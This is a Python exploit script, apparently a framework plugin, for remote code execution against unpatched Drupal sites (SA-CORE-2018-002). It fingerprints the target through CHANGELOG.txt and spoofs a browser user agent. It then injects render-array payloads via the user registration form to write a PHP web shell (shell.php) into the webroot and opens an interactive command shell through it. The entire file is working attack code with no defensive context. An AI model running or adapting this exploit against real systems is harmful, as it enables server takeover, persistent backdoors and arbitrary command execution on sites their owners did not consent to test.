#!/usr/bin/python
Description = 'Remote code execution exploit for Drupal 8.2.3'
from plugin_support import *

import base64
import requests
import re
import urllib
import urllib2

bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + base64.b64encode(bashcmd) + " | base64 -d | tee shell.php"
#bashcmd = "echo morning | tee test.txt"
phpfunction = "passthru"

target = ask.target
base_url = "http://" + target + "/"
# disguise ourselves as mac
headers = {"User-Agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.2.7 (KHTML, like Gecko)'}
opener = urllib2.build_opener(urllib2.HTTPHandler())
opener.addheaders = [("User-Agent", headers["User-Agent"])]

text("Checking wether the target is vulnerable")
vulnerable = True
version = ""
changelog_urls = ["core/CHANGELOG.txt"]

# Try to get version and check for a specific patch
for url in changelog_urls:
    response = requests.get(base_url + url, headers=headers)
    if response.status_code == 200:
        changelog_text = response.text
        if "SA-CORE-2018-002" in changelog_text:
            text("Warning, SA-CORE-2018-002 found in CHANGELOG, the website might be patched")
            vulnerable = False
        version = re.match(r"Drupal (\d\.\d\.\d)", changelog_text)
        if version is None:
            fail("The CHANGELOG file does not appear to contain a version")
            version = "Unknown"
        else:
            version = version.groups()[0]
            text("Drupal version is: " + version)
        break

if not vulnerable:
    fail("The target might've got patched already (Version:" + version)
    anyway = raw_input("Do you want to try anyway?(y/n) ").lower()
    if anyway != "y":
        text("exiting...")
        exit()
else:
    success("Target appears to be vulnerable!!!")


text("Sending payload...")
# attack vector 1
attack_url = base_url + "user/register" + "?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
data = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpfunction + "&mail[a][#type]=markup&mail[a][#markup]=" + bashcmd
opener.open(attack_url, data=data)

# check wether the command actually uploaded the file
check_file_exists = requests.get(base_url + "shell.php", headers=headers)

if check_file_exists.status_code == 200:
    success("The payload got delivered to webroot")
else:
    # if the first attack vector didnt work try the 2nd
    fail("First method did not work, attempting 2nd...")
    # attack vector 2
    attack_url = base_url + "user/register" + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    data = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=" + phpfunction + "&timezone[a][#lazy_builder][][]=" + bashcmd
    opener.open(attack_url, data=data)

    check_file_exists = requests.get(base_url + "shell.php", headers=headers)
    if check_file_exists.status_code == 200:
        success("The payload got delivered to webroot")
    else:
        fail("The payload did apparently not get delivered")
        exit()

text("Opening interactive shell...")
while 1:
    try:
        command = raw_input(target+"> ")
        if command == "exit":
            text("Exiting shell...")
            break
        elif command == "clear":
            run("clear")
            continue
        elif command == "":
            continue

        result = requests.post(base_url + "shell.php", data={"c": command}, headers=headers)
        if result.status_code == 200:
            print(result.text)
        else:
            print("Command could not be executed.")
    except KeyboardInterrupt:
        print("\n")
        text("exiting...")
        exit()
